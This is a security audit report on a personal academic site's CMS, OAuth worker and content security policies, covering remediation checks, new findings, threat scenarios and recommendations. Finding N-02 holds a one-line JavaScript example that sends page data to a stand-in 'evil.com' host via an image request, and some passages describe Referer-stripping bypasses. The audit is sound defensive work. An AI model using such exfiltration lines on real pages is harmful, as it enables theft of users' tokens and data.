# Security Audit — Phase 2: Manual Code Review & Threat Modeling

**Date:** 2026-02-23
**Auditor:** Claude Opus 4.6
**Scope:** Manual review of all security-relevant code; verification of prior remediations; threat modeling

---

## 1. Remediation Verification

Phase 2 (original audit in `SECURITY_AUDIT_PHASE2.md`) identified 16 findings (F-01 through F-16). Phase 1 (automated scanning) confirmed all code-fixable remediations were syntactically present. This section verifies each fix is **semantically correct** — not just present, but actually effective.

| Finding | Expected Fix | Status | Notes |
|---------|-------------|--------|-------|
| F-01 | postMessage restricted to ALLOWED_DOMAINS origin | **VERIFIED** | `targetOrigin` variable used in all three postMessage calls; no `'*'` anywhere |
| F-02 | 5-second fallback restricted | **VERIFIED** | Fallback at line 153 uses same `targetOrigin` variable |
| F-03 | SRI on Decap CMS | **VERIFIED** | sha384 hash + `crossorigin="anonymous"` + exact version `@3.10.0` |
| F-04 | SRI on MathJax | **VERIFIED** | sha384 hash + `crossorigin="anonymous"` + exact version `@3.2.2` |
| F-05 | OAuth scope `repo` only | **VERIFIED** | `scope: "repo"` at worker.js:73 |
| F-06 | ALLOWED_DOMAINS enforcement | **VERIFIED** | Referer check + postMessage origin restriction; see detailed analysis below |
| F-07 | Security headers on token response | **VERIFIED** | Cache-Control, X-Frame-Options, CSP, Referrer-Policy all present |
| F-08 | CSP on admin panel | **VERIFIED** | Meta tag present with appropriate directives |
| F-09 | CSP on public pages | **VERIFIED** | Meta tag present with appropriate directives |
| F-10 | Branch protection | **NOT VERIFIABLE** | Requires GitHub UI; cannot verify from code alone |
| F-11 | Empty state rejected | **VERIFIED** | `if (!state)` check at worker.js:68 returns 400 |
| F-12 | Generic error messages | **VERIFIED** | `console.error()` for details; generic message to user |
| F-13 | Actions pinned to SHAs | **VERIFIED** | All three actions pinned to full 40-char commit SHAs |
| F-14 | pip versions pinned | **VERIFIED** | `requests==2.32.5 beautifulsoup4==4.14.3` |
| F-15 | `{{ content \| safe }}` | N/A | Accepted pattern; no action needed |
| F-16 | wrangler.toml clean | N/A | No issues |

### Detailed Verification Notes

#### F-01/F-02: postMessage Origin Restriction

**Code trace** (`worker.js:117-156`):

```js
const targetOrigin = allowedOrigins.length > 0 ? allowedOrigins[0] : url.origin;
```

Three postMessage calls exist in the callback HTML:
1. **Line 140** (handshake): `window.opener.postMessage('authorizing:' + provider, targetOrigin)` — restricted ✓
2. **Line 146** (token delivery after handshake): `window.opener.postMessage(tokenMsg, targetOrigin)` — restricted ✓
3. **Line 153** (5-second fallback): `window.opener.postMessage(tokenMsg, targetOrigin)` — restricted ✓

The message listener at line 143-149 also validates: `e.origin === targetOrigin` — only messages from the allowed origin trigger token delivery.

**Fallback when ALLOWED_DOMAINS is empty:** `targetOrigin = url.origin` (the worker's own origin, e.g., `https://jpwolfson-cms-auth.jpwolfson.workers.dev`). This means the CMS at `jpwolfson.com` would NOT receive the token — a **safe failure mode**. The OAuth flow simply doesn't work without ALLOWED_DOMAINS configured, rather than falling back to an insecure wildcard.

**Edge case — multiple domains:** Only `allowedOrigins[0]` is used as the postMessage target. If ALLOWED_DOMAINS contains multiple comma-separated domains, only the first receives the token. This is acceptable for a single-site deployment but would be a problem for multi-site setups. See N-06 (INFO).

**Verdict: VERIFIED** — the fix is correct, comprehensive, and fails safely.

#### F-03/F-04: SRI Hashes

**Decap CMS** (`src/admin/index.html:23-25`):
```html
<script src="https://unpkg.com/decap-cms@3.10.0/dist/decap-cms.js"
        integrity="sha384-Yw42/AXF834YFNra0g9Mm3CluXF/L7H12eabT/fRPqq56Gp3mFYdFR24hgGi5iAQ"
        crossorigin="anonymous"></script>
```

**MathJax** (`src/_includes/base.njk:28-30`):
```html
<script async src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-chtml.js"
        integrity="sha384-AHAnt9ZhGeHIrydA1Kp1L7FN+2UosbF7RQg6C+9Is/a7kDpQ1684C2iH2VWil6r4"
        crossorigin="anonymous"></script>
```

Verification checklist:
- [x] Versions pinned to exact release (not range): `@3.10.0`, `@3.2.2`
- [x] `integrity` attribute with sha384 hash present
- [x] `crossorigin="anonymous"` present (required for SRI enforcement on cross-origin scripts)
- [x] Comments in source with commands to recompute hashes on upgrade
- [ ] **Independent hash verification against CDN** — blocked by network proxy (Phase 1 also blocked); remains an open verification item

**Verdict: VERIFIED** (pending independent hash verification from unrestricted network).

#### F-06: ALLOWED_DOMAINS Enforcement

The implementation has three layers:

1. **Referer check on `/oauth/authorize`** (`worker.js:52-65`): If Referer header is present and ALLOWED_DOMAINS is configured, validates the referer's origin against the allowed list. Rejects mismatches with 403.

2. **`isOriginAllowed()` function** (`worker.js:38-42`): Checks exact match OR subdomain match via `.endsWith("." + domain)`. The dot-prefix prevents domain confusion (e.g., `evil-jpwolfson.com` does NOT match `jpwolfson.com` because it doesn't end with `.jpwolfson.com`).

3. **postMessage `targetOrigin`** (`worker.js:117-118`): The token is only delivered to the first allowed origin, regardless of who triggered the flow.

**Bypass analysis of the Referer check:**

Lines 62-65 allow requests with no Referer header when domains are configured:
```js
} else if (allowedOrigins.length > 0 && !referer) {
    // No referer but domains are configured — allow (some browsers strip Referer)
    // The postMessage origin restriction is the primary defense.
}
```

This means the Referer check can be bypassed by omitting the Referer (via `<meta name="referrer" content="no-referrer">` on the attacker's page, or by direct navigation). However, this only bypasses the Referer check — the postMessage `targetOrigin` restriction (the primary defense) remains intact. See N-08 (INFO) for detailed analysis.

**Verdict: VERIFIED** — enforcement is present and the primary defense (postMessage restriction) is sound. The Referer check is a secondary defense-in-depth measure with a known, documented, and acceptable bypass.

#### F-11: State Parameter Validation

```js
const state = url.searchParams.get("state");
if (!state) {
    return new Response("Missing state parameter", { status: 400 });
}
```

Empty or absent `state` is now rejected. Note that the worker is a stateless proxy — it passes state through to GitHub and back but does not generate, sign, or validate it server-side. Decap CMS handles state generation and validation on the client side, which is the standard pattern for stateless OAuth proxies. The CSRF protection ultimately comes from the postMessage origin check, not the state parameter.

**Verdict: VERIFIED** — the specific fix (reject empty state) is correct. The broader design (client-side state validation via CMS) is acceptable for this architecture.

---

## 2. New Findings

| # | Severity | File | Title |
|---|----------|------|-------|
| N-01 | **LOW** | admin/index.html | Admin page frameable — no `frame-ancestors` or `X-Frame-Options` HTTP header |
| N-02 | **LOW** | admin/index.html, base.njk | `img-src https:` in CSP allows data exfiltration via image requests |
| N-03 | **LOW** | (absent) | Missing `_headers` file for HTTP-level security headers |
| N-04 | **LOW** | link-audit.yml | No explicit `permissions:` block in GitHub Actions workflow |
| N-05 | **INFO** | admin/index.html, base.njk | Cloudflare Web Analytics script allowed in CSP without SRI |
| N-06 | **INFO** | worker.js:117-118 | `targetOrigin` only uses first domain from ALLOWED_DOMAINS |
| N-07 | **INFO** | (Decap CMS behavior) | OAuth token stored in localStorage by Decap CMS |
| N-08 | **INFO** | worker.js:62-65 | Referer check on /oauth/authorize bypassable by omitting Referer |

### N-01 — LOW: Admin page frameable (no anti-framing HTTP header)

**File:** `src/admin/index.html`

The admin page's CSP includes `frame-src 'none'`, which prevents the admin page from embedding frames/iframes within itself. However, `frame-src` does **not** prevent the admin page from being framed BY another page. The directive that prevents framing is `frame-ancestors`, but **`frame-ancestors` is not supported in CSP meta tags** — it is only respected when delivered via HTTP header.

Without a `_headers` file or Cloudflare Transform Rule setting `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`, the admin page at `https://jpwolfson.com/admin/` can be embedded in an iframe on any site.

**Practical impact:** Low. Clickjacking the CMS admin requires:
- The user to be logged into the CMS (token in localStorage)
- Precise UI manipulation through the frame
- The CMS UI is complex enough that useful clickjacking attacks are difficult to construct

For a single-user academic site, this is a minor defense-in-depth gap, not an exploitable vulnerability.

**Remediation:** Add `X-Frame-Options: DENY` via a `_headers` file (see N-03) or Cloudflare Transform Rule.

---

### N-02 — LOW: `img-src https:` allows data exfiltration via image requests

**Files:** `src/admin/index.html:11`, `src/_includes/base.njk:10`

Both CSP policies include `img-src 'self' data: https:`, which allows loading images from **any HTTPS URL**. This is a well-known CSP bypass: if an attacker achieves JavaScript execution on the page, they can exfiltrate data via:

```js
new Image().src = "https://evil.com/steal?data=" + encodeURIComponent(sensitiveData);
```

This bypasses the `connect-src` restriction, which only controls `fetch()`, `XMLHttpRequest`, and WebSocket connections.

**Practical impact on admin page:** If code execution is achieved (requiring bypass of SRI, which is extremely difficult with correct hashes), an attacker could exfiltrate the OAuth token from localStorage via an image request. However, achieving code execution in the first place is the hard part — SRI on the external Decap CMS script is the primary barrier.

**Practical impact on public pages:** No sensitive data to exfiltrate. Minimal concern.

**Remediation:** Restrict `img-src` to specific domains if feasible. For the admin page, `img-src 'self' data: https://raw.githubusercontent.com` might work (Decap CMS loads images from the repo). However, this requires testing — Decap CMS may load preview images from other sources. For public pages, `img-src 'self' data: https:` is reasonable since pages may legitimately link to external images.

---

### N-03 — LOW: Missing `_headers` file for HTTP-level security headers

**Confirmed by:** Glob search for `_headers` — no file found anywhere in the repo.

Phase 1 flagged this. No `_headers` file exists, so the following security headers are not set at the HTTP level:

| Header | Impact |
|--------|--------|
| `Strict-Transport-Security` | Cloudflare enforces HTTPS at the edge, but HSTS adds preload protection |
| `X-Content-Type-Options: nosniff` | Prevents MIME-sniffing; low risk for a site serving standard content types |
| `X-Frame-Options: DENY` | Prevents framing/clickjacking (see N-01) |
| `Referrer-Policy: strict-origin-when-cross-origin` | Controls Referer header leakage |
| `Permissions-Policy: camera=(), microphone=(), geolocation=()` | Disables unused browser APIs |

**Note on CSP delivery method:** The site uses `<meta http-equiv="Content-Security-Policy">` tags, which have two limitations compared to HTTP headers:
1. `frame-ancestors` directive is ignored in meta tags (relevant to N-01)
2. Meta tag CSP doesn't protect prefetch requests or responses before HTML parsing begins

For a static site, these limitations are minor. The meta tag approach is adequate for CSP, but the missing headers above should be delivered via `_headers` file.

**Remediation:** Create `jpwolfson-site/src/_headers` (Eleventy passes through files in `src/` via `addPassthroughCopy`) or add at the repo root with Eleventy configured to copy it:

```
/*
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
```

Note: `_headers` would need to be in the Eleventy output directory (`_site/`) to be picked up by Cloudflare Pages. Currently `.eleventy.js` passes through `src/css`, `src/admin`, and `src/files` but not arbitrary root files. Either add `eleventyConfig.addPassthroughCopy({ "src/_headers": "/_headers" })` or place the file directly in the output.

---

### N-04 — LOW: No explicit `permissions:` block in GitHub Actions workflow

**File:** `.github/workflows/link-audit.yml`

The workflow has no `permissions:` block. In repositories with default `GITHUB_TOKEN` permissions set to "read and write" (the old GitHub default), the workflow inherits write access to repository contents.

The link-audit workflow doesn't use `GITHUB_TOKEN` and has no access to repository secrets, so the actual risk is minimal. However, adding an explicit permissions block is a defense-in-depth best practice.

**Remediation:**
```yaml
jobs:
  audit:
    runs-on: ubuntu-latest
    permissions:
      contents: read
```

---

### N-05 — INFO: Cloudflare Web Analytics script allowed in CSP without SRI

**Files:** `src/admin/index.html:8`, `src/_includes/base.njk:8`

Both CSP policies allow `https://static.cloudflareinsights.com` in `script-src` and `https://cloudflareinsights.com` in `connect-src`. These are for Cloudflare Web Analytics, which Cloudflare Pages injects automatically at the edge — the script tag is not present in the source HTML.

Since the script is injected by Cloudflare's edge servers (not from source), there is no opportunity to add an SRI hash. This is an inherent aspect of using Cloudflare's auto-injected analytics. Trusting Cloudflare-managed domains is a requirement of hosting on Cloudflare Pages.

**Verdict:** Acceptable. The trust boundary is the hosting provider itself.

---

### N-06 — INFO: `targetOrigin` only uses first domain from ALLOWED_DOMAINS

**File:** `worker.js:117-118`

```js
const targetOrigin = allowedOrigins.length > 0 ? allowedOrigins[0] : url.origin;
```

If `ALLOWED_DOMAINS` contains multiple comma-separated domains (e.g., `jpwolfson.com,preview.jpwolfson.com`), only the first domain receives the OAuth token via postMessage. This is fine for the current single-site deployment but would silently break CMS logins from any secondary domain.

**Verdict:** Acceptable for current use case. Document the limitation if multi-domain support is ever needed.

---

### N-07 — INFO: OAuth token stored in localStorage by Decap CMS

Decap CMS stores the GitHub OAuth token in `localStorage` (under a key like `netlify-cms-user`). This means:

- The token **persists across browser sessions** (survives tab close, browser restart)
- Any JavaScript executing on the same origin can read it via `localStorage.getItem()`
- The token remains until the user explicitly logs out or clears browser data

This is Decap CMS's built-in behavior and cannot be changed without modifying the CMS source code. The CSP on the admin page limits which scripts can execute (and thus access localStorage), providing the primary protection.

**Verdict:** Inherent to Decap CMS architecture. The CSP + SRI combination adequately protects the token from unauthorized access under normal conditions.

---

### N-08 — INFO: Referer check on /oauth/authorize bypassable by omitting Referer

**File:** `worker.js:62-65`

The ALLOWED_DOMAINS Referer check explicitly allows requests without a Referer header:

```js
} else if (allowedOrigins.length > 0 && !referer) {
    // No referer but domains are configured — allow (some browsers strip Referer)
    // The postMessage origin restriction is the primary defense.
}
```

An attacker can omit the Referer by:
- Setting `<meta name="referrer" content="no-referrer">` on their page
- Using `rel="noreferrer"` on links
- Direct navigation (typing URL in address bar)

**Why this is acceptable:** The Referer check is a **secondary** defense. The primary defense is the postMessage `targetOrigin` restriction — even if an attacker triggers the OAuth flow, the token is only delivered via postMessage to the first allowed domain. The attacker's page (on a different origin) cannot receive it.

**When this matters:** Only if the attacker controls a page on `jpwolfson.com` itself (e.g., via XSS or subdomain takeover). In that scenario, both the Referer check and the postMessage check would pass. However, controlling a page on the target domain is already a critical compromise with broader implications.

**Verdict:** The defense-in-depth is slightly weakened (one of two layers is bypassable), but the primary defense holds. The code comment correctly documents this tradeoff.

---

## 3. Threat Scenarios

### Scenario 1: Token Theft via Malicious Page (Post-Remediation)

- **Attacker:** External attacker with a web presence
- **Vector:** Create a page at `evil.com` that opens a popup to `/oauth/authorize`, hoping to intercept the OAuth token via postMessage
- **Prerequisites:** User has previously authorized the GitHub OAuth App (so GitHub auto-redirects without prompting); attacker must control a page on `jpwolfson.com` or a subdomain (to match `targetOrigin`)
- **Impact:** If successful: GitHub token with `repo` scope → full read/write access to all repos the user can access
- **Current mitigations:**
  - postMessage `targetOrigin` restricted to first ALLOWED_DOMAINS origin (`https://jpwolfson.com`)
  - Browser enforces that postMessage with a specific targetOrigin is only delivered to windows on that origin
  - Attacker at `evil.com` cannot receive the message (different origin)
- **Residual risk:** **Very low.** Attack requires controlling a page on `jpwolfson.com` itself — which requires DNS access, a subdomain takeover vulnerability, or XSS on the site. None of these are currently present. Pre-remediation (F-01/F-02), this was a trivial one-click attack; post-remediation, it requires domain-level compromise as a prerequisite.

### Scenario 2: Supply Chain Compromise — CDN/npm Package Takeover

- **Attacker:** Sophisticated attacker (nation-state, organized crime) targeting npm infrastructure or CDN providers
- **Vector:** Compromise the `decap-cms` npm package (e.g., maintainer account takeover) or the unpkg.com/jsdelivr.net CDN infrastructure to serve malicious JavaScript
- **Prerequisites:** Control over CDN or npm package publication for the specific pinned version
- **Impact:**
  - **Without SRI (pre-remediation):** Full token theft from admin page; arbitrary JavaScript execution on all public pages (crypto mining, visitor redirection, defacement)
  - **With SRI (current state):** **Blocked.** The browser compares the downloaded file's hash against the `integrity` attribute and refuses to execute on mismatch. The attacker would need to produce a file with the exact same SHA-384 hash as the legitimate version — computationally infeasible.
- **Current mitigations:**
  - SRI hashes on both CDN scripts (F-03, F-04 remediated)
  - Exact version pinning (`@3.10.0`, `@3.2.2`) — prevents version-range resolution to a new malicious version
  - `crossorigin="anonymous"` enables SRI enforcement for cross-origin scripts
- **Residual risk:** **Very low while SRI hashes are in place.** Risk temporarily increases during version upgrades (when hashes must be recomputed). The comments in the HTML source include the exact commands to recompute hashes, which reduces the chance of accidentally removing SRI during an upgrade. The Cloudflare Web Analytics script (injected at edge, no SRI) is a separate trust boundary — compromise of Cloudflare itself would have broader implications than script injection.

### Scenario 3: CMS Content Injection via Compromised GitHub Token

- **Attacker:** Anyone who obtains a valid GitHub token with `repo` scope
- **Vector:** Use the token to push malicious commits directly to `main` via the GitHub API
- **Prerequisites:** Valid GitHub token (obtained via token theft, phishing, or leaked credentials)
- **Impact:**
  - **Via CMS UI:** Limited to modifying predefined markdown pages in `config.yml`. Markdown content is processed by markdown-it with `html: false` (default), which escapes raw HTML tags. XSS injection via markdown is **not possible** with this configuration.
  - **Via direct git/API:** Full repository access. Attacker can modify templates (`.njk`), configuration (`.eleventy.js`), or the OAuth worker (`worker.js`). Can inject arbitrary JavaScript via template modification. Can access all other repos the token owner can access.
- **Current mitigations:**
  - postMessage origin restriction makes token theft via the OAuth flow very difficult (Scenario 1)
  - `publish_mode: simple` limits CMS UI to predefined pages (not arbitrary file creation)
  - markdown-it's default `html: false` prevents XSS via markdown content
  - `scope: "repo"` (F-05 remediated) — no access to user profile data
- **Residual risk:** **Medium for the token scope issue.** GitHub OAuth's `repo` scope grants access to ALL repos the user can access, not just `jpwolfson-site`. This is a GitHub platform limitation — there is no per-repo OAuth scope. If branch protection (F-10) is enabled on `main`, direct pushes can be prevented, forcing changes through PRs. Without branch protection, a compromised token allows immediate deployment of malicious content.

### Scenario 4: CI Pipeline Compromise

- **Attacker:** Malicious contributor, or attacker who compromises the `requests` or `beautifulsoup4` pip packages
- **Vector:** Exploit the GitHub Actions workflow to execute arbitrary code on the CI runner
- **Prerequisites:** Write access to the repo (to modify the workflow file) OR compromise of a pinned pip package version
- **Impact:**
  - The workflow runs on `ubuntu-latest` with default permissions
  - No repository secrets are referenced (`grep "secrets." link-audit.yml` → clean)
  - No deployment keys or tokens available
  - Attacker gets code execution on an ephemeral GitHub Actions runner — can exfiltrate the `GITHUB_TOKEN` (which has default permissions), potentially accessing repository contents and creating issues/PRs
- **Current mitigations:**
  - All GitHub Actions pinned to full commit SHAs (F-13 remediated)
  - pip packages pinned to exact versions (F-14 remediated)
  - Workflow only runs link audit — no deployment or secret access
  - Narrow path filter (`push.paths` limited to `jpwolfson-site/src/**` and the audit script)
- **Residual risk:** **Very low.** Even if the runner is compromised, the blast radius is limited to the ephemeral runner environment. Adding an explicit `permissions: contents: read` block (N-04) would further limit the `GITHUB_TOKEN` scope.

### Scenario 5: Subdomain Takeover → Token Interception

- **Attacker:** External attacker who can register or claim a subdomain of `jpwolfson.com`
- **Vector:** If a DNS CNAME record for `*.jpwolfson.com` or a specific subdomain (e.g., `old.jpwolfson.com`) points to an unclaimed resource (e.g., a deleted Heroku app, GitHub Pages, AWS S3 bucket), the attacker can claim that resource and serve content on the subdomain
- **Prerequisites:** A dangling CNAME record for a subdomain of `jpwolfson.com`
- **Impact:** The `isOriginAllowed()` function accepts any subdomain of `jpwolfson.com`. A page on `evil.jpwolfson.com` would pass both the Referer check and the postMessage origin check (since `targetOrigin` is `https://jpwolfson.com` — wait, actually `targetOrigin` is the exact first allowed origin, `https://jpwolfson.com`, not `https://evil.jpwolfson.com`). The postMessage would target `https://jpwolfson.com`, which `evil.jpwolfson.com` would NOT match.
- **Current mitigations:**
  - `targetOrigin` is the exact first allowed origin (e.g., `https://jpwolfson.com`), not a wildcard
  - Browser postMessage origin enforcement prevents delivery to different origins
  - The subdomain matching in `isOriginAllowed()` is only used for the Referer check, which is the secondary defense
- **Residual risk:** **Very low.** Even with a subdomain takeover, the postMessage restriction prevents token delivery to the subdomain. The attacker could bypass the Referer check but not the primary defense.

---

## 4. CSP Deep Dive

### Admin Page CSP (`src/admin/index.html:6-12`)

```
default-src 'self';
script-src 'self' 'unsafe-eval' 'unsafe-inline' https://unpkg.com https://static.cloudflareinsights.com;
style-src 'self' 'unsafe-inline' https://unpkg.com;
connect-src 'self' https://api.github.com https://jpwolfson-cms-auth.jpwolfson.workers.dev https://cloudflareinsights.com;
img-src 'self' data: https:;
frame-src 'none';
```

#### Directive-by-directive analysis:

| Directive | Value | Assessment |
|-----------|-------|------------|
| `default-src` | `'self'` | Good baseline — restricts unlisted resource types to same origin |
| `script-src` | `'self' 'unsafe-eval' 'unsafe-inline' https://unpkg.com https://static.cloudflareinsights.com` | **Weakened by `unsafe-eval` + `unsafe-inline`** (see below) |
| `style-src` | `'self' 'unsafe-inline' https://unpkg.com` | Acceptable — Decap CMS uses inline styles extensively |
| `connect-src` | `'self' https://api.github.com https://jpwolfson-cms-auth.jpwolfson.workers.dev https://cloudflareinsights.com` | Good — only allows necessary API endpoints |
| `img-src` | `'self' data: https:` | **Overly broad** — `https:` allows image loads from any HTTPS URL (see N-02) |
| `frame-src` | `'none'` | Good — prevents embedding frames. Note: does NOT prevent being framed (see N-01) |

#### The `unsafe-eval` + `unsafe-inline` problem

**Why they're required:**
- `unsafe-eval`: Decap CMS uses `eval()`, `Function()`, or equivalent dynamic code evaluation internally. Removing it breaks the CMS.
- `unsafe-inline`: Required for any inline `<script>` blocks. The current admin page has no inline scripts (the single script tag is external), but Decap CMS may inject inline scripts dynamically.

**Security implications:**
- `unsafe-inline` **partially negates SRI protection for inline scripts**: SRI protects external scripts (the browser checks the hash before executing), but `unsafe-inline` allows ANY inline `<script>` to execute without hash verification. If an attacker achieves HTML injection, they can inject and execute inline scripts.
- `unsafe-eval` allows `eval()`-based code execution, broadening the attack surface if XSS is achieved.
- Combined, these directives mean that if an attacker achieves HTML injection on the admin page, they can execute arbitrary JavaScript. The primary barriers are: (a) the page has no user input fields, (b) content comes from a CDN script protected by SRI, (c) HTTPS prevents network-level injection.

**The SRI + `unsafe-inline` interaction clarified:**
- External `<script src="...">` with `integrity` attribute: SRI is still enforced. A compromised CDN serving a different file will be blocked.
- Inline `<script>` tags: Allowed unconditionally by `unsafe-inline`, regardless of SRI. There are no integrity checks on inline scripts when `unsafe-inline` is present.
- Therefore: SRI protects against CDN compromise, but does NOT protect against injected inline scripts.

#### Missing `frame-ancestors`

The `frame-src 'none'` directive controls what the admin page can embed, not whether it can be embedded. The `frame-ancestors` directive (which controls framing) is **not supported in CSP meta tags** — it requires HTTP header delivery. Without a `_headers` file, there is no anti-framing protection on the admin page. See N-01.

### Public Pages CSP (`src/_includes/base.njk:6-12`)

```
default-src 'self';
script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com;
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
font-src 'self' https://cdn.jsdelivr.net;
connect-src 'self' https://cloudflareinsights.com;
```

| Directive | Value | Assessment |
|-----------|-------|------------|
| `default-src` | `'self'` | Good |
| `script-src` | `'self' 'unsafe-inline' https://cdn.jsdelivr.net https://static.cloudflareinsights.com` | `unsafe-inline` required for MathJax config block (lines 15-19 of base.njk). No `unsafe-eval` — better than admin page |
| `style-src` | `'self' 'unsafe-inline'` | Acceptable |
| `img-src` | `'self' data: https:` | Same broad allowance as admin page, but no tokens to exfiltrate on public pages |
| `font-src` | `'self' https://cdn.jsdelivr.net` | Good — MathJax loads WOFF fonts from jsdelivr |
| `connect-src` | `'self' https://cloudflareinsights.com` | Good — only Cloudflare analytics beacons |

**The `unsafe-inline` requirement:** The MathJax configuration block at lines 15-19 of base.njk is an inline `<script>` that sets `MathJax = { ... }`. This must execute before the external MathJax script loads. Without `unsafe-inline`, this configuration block would be blocked. An alternative would be to use a CSP nonce or hash for this specific inline script, but nonces require server-side generation (not available on a static site), and script hashes require the script content to be deterministic (feasible here but adds maintenance burden).

### OAuth Worker Callback CSP (`worker.js:166-167`)

```
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'
```

This is the most restrictive CSP — `default-src 'none'` blocks all resource types except inline scripts. The callback page only needs its inline script to run (for the postMessage handshake). No external resources, images, styles, or connections are needed. This is well-designed.

---

## 5. Recommendations

### Immediate (do now)

| # | Action | Addresses | Effort |
|---|--------|-----------|--------|
| 1 | Add `_headers` file with `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()` | N-01, N-03 | Low |
| 2 | Add `permissions: contents: read` to GitHub Actions workflow | N-04 | Trivial |

### Short-term (this week)

| # | Action | Addresses | Effort |
|---|--------|-----------|--------|
| 3 | Verify SRI hashes from an unrestricted network (run the `curl \| openssl` commands in the HTML comments) | F-03, F-04 open verification | Low |
| 4 | Enable branch protection on `main` in GitHub settings (require PR or restrict pushers) | F-10 | Low (GitHub UI) |
| 5 | Restrict `img-src` on admin page to `'self' data: https://raw.githubusercontent.com` (test with Decap CMS first) | N-02 | Low (needs testing) |

### Long-term (when convenient)

| # | Action | Addresses | Effort |
|---|--------|-----------|--------|
| 6 | Replace inline MathJax config with CSP hash (`sha256-<hash>` in `script-src`) to remove `unsafe-inline` from public pages | CSP hardening | Medium (needs hash computation and testing) |
| 7 | Investigate Decap CMS's `unsafe-eval` requirement — check if newer versions have reduced this dependency | CSP hardening | Low (research only) |
| 8 | Consider adding `Strict-Transport-Security` via Cloudflare Transform Rule (can't be set via `_headers` on Cloudflare Pages for the root domain without a paid plan, but can be set via dashboard) | Defense-in-depth | Low |

---

## 6. Overall Assessment

The site's security posture is **good for a personal academic website** and has improved substantially from the original audit. The two critical findings (F-01/F-02: postMessage wildcard token delivery) have been comprehensively remediated — the fix is correct, uses the right approach (explicit targetOrigin), and fails safely when ALLOWED_DOMAINS is unset. The supply chain risk from CDN-loaded scripts is well-mitigated by SRI hashes with exact version pinning and crossorigin attributes.

The remaining findings are all LOW or INFO severity. The most actionable improvement is adding a `_headers` file for HTTP-level security headers (particularly `X-Frame-Options` to prevent framing of the admin page). The CSP policies are as restrictive as the dependencies allow — `unsafe-eval` and `unsafe-inline` are unfortunate necessities imposed by Decap CMS and MathJax respectively, and the code comments correctly document why they're required.

The primary residual risk is the GitHub OAuth `repo` scope, which grants access to all of the user's repositories rather than just `jpwolfson-site`. This is a GitHub platform limitation, not a code deficiency. Enabling branch protection on `main` (F-10, not yet verified) would mitigate the most dangerous consequence of token compromise (direct push to production). For a personal academic site with a single authorized user, the current security posture represents a reasonable balance between protection and maintainability.

**Open verification items** (blocked by network restrictions in both Phase 1 and Phase 2):
1. Independent SRI hash verification against live CDN content
2. Live HTTP security header audit of `https://jpwolfson.com` and `https://jpwolfson.com/admin/`
3. Verification of ALLOWED_DOMAINS configuration on the live Cloudflare Worker
4. Verification of branch protection rules on the GitHub repository
